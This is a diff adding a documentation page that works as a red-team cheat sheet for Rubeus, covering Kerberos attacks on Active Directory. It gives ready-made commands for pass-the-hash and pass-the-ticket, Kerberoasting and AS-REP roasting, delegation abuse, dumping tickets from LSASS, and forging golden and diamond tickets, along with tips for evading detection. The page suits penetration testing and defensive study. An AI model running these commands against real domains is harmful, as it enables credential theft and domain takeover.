@@ -1,0 +1,236 @@
+---
+title: Rubeus Overview
+description: Comprehensive guide to Rubeus commands for Kerberos interaction, ticket requests, and Active Directory attacks.
+---
+
+# Rubeus Overview
+
+Rubeus is a C# toolset for raw Kerberos protocol interaction and abuse. It is heavily inspired by `kekeo` and `Mimikatz` but provides more flexibility and raw protocol access for Kerberos tickets, AS-REP roasting, and delegation abuse.
+
+<Callout type="info" title="Prerequisites">
+Most Rubeus commands require elevated privileges (Administrator/SYSTEM) to interact with LSASS, except for operations like AS-REP roasting or Kerberoasting which only require standard domain user privileges.
+</Callout>
+
+---
+
+## Ticket Operations
+
+Rubeus provides raw control over Kerberos Ticket Granting Tickets (TGT) and Ticket Granting Service (TGS) tickets.
+
+<Tabs>
+  <Tab title="Requesting TGTs (asktgt)">
+    Used to request a TGT for a user. This is the core of OverPass-the-Hash (OPTH) attacks.
+    
+    ```powershell
+    # OverPass-the-Hash using NTLM hash
+    Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /domain:domain.local /dc:dc01.domain.local /ptt
+
+    # Using AES256 key (OpSec safer)
+    Rubeus.exe asktgt /user:Administrator /aes256:AES_KEY /domain:domain.local /dc:dc01.domain.local /ptt
+    ```
+    * `/ptt` : Passes the ticket directly into the current logon session.
+  </Tab>
+
+  <Tab title="Requesting TGS (asktgs)">
+    Used to request a service ticket using an existing TGT.
+    
+    ```powershell
+    Rubeus.exe asktgs /ticket:base64_ticket /service:cifs/dc01.domain.local /dc:dc01.domain.local /ptt
+    ```
+    * `/service` : Can accept comma-separated SPNs.
+  </Tab>
+
+  <Tab title="Pass-the-Ticket (ptt)">
+    Injects a base64 encoded .kirbi ticket into the current logon session.
+    
+    ```powershell
+    Rubeus.exe ptt /ticket:doIFmjCC...
+    ```
+    Or inject a `.kirbi` file directly:
+    ```powershell
+    Rubeus.exe ptt /ticket:C:\temp\ticket.kirbi
+    ```
+  </Tab>
+</Tabs>
+
+---
+
+## Attack Techniques
+
+### AS-REP Roasting
+
+Requests AS-REP messages for users with "Do not require Kerberos preauthentication" enabled. Does not require elevated privileges.
+
+```powershell
+Rubeus.exe asreproast /user:victim_user /domain:domain.local /dc:dc01.domain.local /format:hashcat /outfile:hashes.txt
+```
+
+### Kerberoasting
+
+Requests TGS tickets for services with registered SPNs and extracts them for offline cracking. Does not require elevated privileges.
+
+<Tabs>
+  <Tab title="Standard Kerberoasting">
+    ```powershell
+    Rubeus.exe kerberoast /outfile:hashes.txt
+    ```
+  </Tab>
+  <Tab title="Targeted Kerberoasting">
+    ```powershell
+    Rubeus.exe kerberoast /user:svc_mssql /domain:domain.local /dc:dc01.domain.local /outfile:hashes.txt
+    ```
+  </Tab>
+  <Tab title="AES OpSec Safe">
+    Requests AES tickets instead of RC4 to avoid detection (though harder to crack).
+    ```powershell
+    Rubeus.exe kerberoast /domain:domain.local /dc:dc01.domain.local /aes
+    ```
+  </Tab>
+</Tabs>
+
+### S4U2Self & S4U2Proxy (Constrained Delegation)
+
+Used to abuse Constrained Delegation. Allows an attacker to impersonate a user to a service they are not explicitly delegated to, provided they have the service account's hash.
+
+<Steps>
+  <Step title="Step 1: S4U2Self (Get TGS for Impersonated User)">
+    ```powershell
+    Rubeus.exe s4u /user:websvc /rc4:NTLM_HASH /impersonateuser:Administrator /domain:domain.local /dc:dc01.domain.local /msdsspn:http/websvc.domain.local /ptt
+    ```
+  </Step>
+  <Step title="Step 2: S4U2Proxy (Forward to Target Service)">
+    If you need to use the ticket for a different service (e.g., CIFS instead of HTTP):
+    ```powershell
+    Rubeus.exe s4u /user:websvc /rc4:NTLM_HASH /impersonateuser:Administrator /domain:domain.local /dc:dc01.domain.local /msdsspn:http/websvc.domain.local /altservice:cifs /ptt
+    ```
+  </Step>
+</Steps>
+
+<Callout type="warning" title="Note on S4U">
+The `/altservice` parameter is extremely powerful as it allows substituting the service type (e.g., HTTP to CIFS) if the service account is configured for Constrained Delegation.
+</Callout>
+
+---
+
+## Ticket Management & Extraction
+
+These commands require high integrity (Administrator/SYSTEM) to interact with LSASS memory.
+
+<Tabs>
+  <Tab title="Dump (Extract Tickets)">
+    Extracts all usable Kerberos tickets from LSASS.
+    ```powershell
+    Rubeus.exe dump /outfile:C:\temp\tickets\
+    ```
+  </Tab>
+  <Tab title="Triage (Readable View)">
+    Displays active Kerberos tickets in the current logon session in a readable table format.
+    ```powershell
+    Rubeus.exe triage
+    ```
+  </Tab>
+  <Tab title="Purge (Clear Tickets)">
+    Purges all Kerberos tickets from the current logon session.
+    ```powershell
+    Rubeus.exe purge
+    ```
+  </Tab>
+</Tabs>
+
+---
+
+## Monitoring & Harvesting
+
+Useful for capturing tickets on systems configured for Unconstrained Delegation.
+
+<Callout type="danger" title="High Network Traffic">
+Monitoring commands like `monitor` and `harvest` generate significant network traffic and should be used carefully in production environments.
+</Callout>
+
+<Tabs>
+  <Tab title="Monitor">
+    Monitors for new TGT requests (Event ID 4768) and prints them to the console.
+    ```powershell
+    Rubeus.exe monitor /interval:30
+    ```
+    * `/interval` : Monitoring interval in seconds.
+  </Tab>
+  <Tab title="Harvest">
+    Monitors for TGTs and keeps them cached, renewing them if necessary, to maintain access.
+    ```powershell
+    Rubeus.exe harvest /interval:30
+    ```
+  </Tab>
+</Tabs>
+
+---
+
+## Advanced Ticket Forgery
+
+### Golden Ticket
+
+Forges a TGT using the `krbtgt` hash.
+
+```powershell
+Rubeus.exe golden /rc4:KRBTGT_NTLM_HASH /domain:domain.local /sid:S-1-5-21-... /user:Administrator /id:500 /ptt
+```
+
+### Diamond Ticket
+
+A stealthier alternative to the Golden Ticket. It requests a legitimate TGT from the DC using `asktgt` and modifies its contents (PAC) on the fly to elevate privileges.
+
+<Steps>
+  <Step title="Generate the Diamond Ticket">
+    ```powershell
+    Rubeus.exe diamond /krbkey:KRBTGT_AES_KEY /user:lowpriv_user /password:Passw0rd! /enctype:aes256 /ticketuser:Administrator /domain:domain.local /dc:dc01.domain.local /ptt
+    ```
+  </Step>
+  <Step title="Verification">
+    Verify the elevated context:
+    ```powershell
+    klist
+    whoami /groups
+    ```
+  </Step>
+</Steps>
+
+---
+
+## References & Resources
+
+<CardGroup cols={2}>
+  <Card title="GhostPack Rubeus GitHub" href="https://github.com/GhostPack/Rubeus" icon="github">
+    Official Rubeus repository and source code.
+  </Card>
+  <Card title="HarmJ0y Blog" href="https://www.harmj0y.net/blog/" icon="book">
+    Original research and posts by the creator of Rubeus.
+  </Card>
+  <Card title="SpecterOps Rubeus Docs" href="https://docs.specterops.io/ghostpack-docs/rubeus/" icon="shield">
+    Official SpecterOps documentation for Rubeus.
+  </Card>
+  <Card title="MITRE ATT&CK" href="https://attack.mitre.org/techniques/T1558/" icon="bug">
+    Kerberos Ticket Abuse Techniques (T1558).
+  </Card>
+</CardGroup>
+
+<AccordionGroup>
+  <Accordion title="📋 Full Command Reference List">
+    | Command | Description |
+    | --- | --- |
+    | `asktgt` | Request a TGT for a user (OPTH). |
+    | `asktgs` | Request a TGS using an existing TGT. |
+    | `ptt` | Pass the ticket into the current logon session. |
+    | `asreproast` | Roast users with pre-auth disabled. |
+    | `kerberoast` | Roast service accounts with SPNs. |
+    | `s4u` | Abuse Constrained Delegation (S4U2Self/S4U2Proxy). |
+    | `dump` | Extract tickets from LSASS. |
+    | `triage` | View current session tickets. |
+    | `purge` | Purge current session tickets. |
+    | `monitor` | Monitor for new TGTs (Unconstrained Delegation). |
+    | `harvest` | Monitor and renew TGTs. |
+    | `golden` | Forge a Golden Ticket. |
+    | `diamond` | Forge a Diamond Ticket (Stealthier Golden). |
+    | `createnetonly` | Create a sacrificial process (Logon ID) for ticket injection. |
+    | `hash` | Calculate NTLM/AES hashes from a password. |
+  </Accordion>
+</AccordionGroup>
